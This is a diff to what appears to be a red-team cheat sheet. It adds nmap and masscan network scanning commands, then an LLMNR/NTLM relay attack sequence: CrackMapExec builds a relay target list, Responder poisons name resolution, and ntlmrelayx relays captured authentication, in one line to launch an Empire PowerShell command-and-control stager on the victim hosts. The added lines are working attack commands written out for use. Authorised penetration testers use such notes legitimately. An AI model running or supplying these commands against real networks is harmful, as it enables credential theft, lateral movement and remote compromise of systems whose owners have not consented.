@@ -1,3 +1,9 @@
 host detection: nmap -vv -R --reason -sn --max-rate 150 -PS22-25,80,139,161,162,443,445,1433,3389,8443,8080 -PA22-25,80,139,161,162,443,445,1433,3389,8443,8080 -iL $target_file -oA ${out} &
 service detection: nmap -vv -Pn -sTV --open --reason --top-ports 1000 --script ssl-cert --max-rate 175 -iL $TARGET_FILE --randomize-hosts -oA $OUTPUT_FILE
 service detection: masscan --rate 100000 --top-ports 1000 --banners -iL
+
+llmnr: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
+llmnr: cme smb <CIDR> --gen-relay-list targets.txt
+llmnr: python Responder.py -I <interface> -r -d -w
+llmnr: ntlmrelayx.py -tf targets.txt
+llmnr: ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
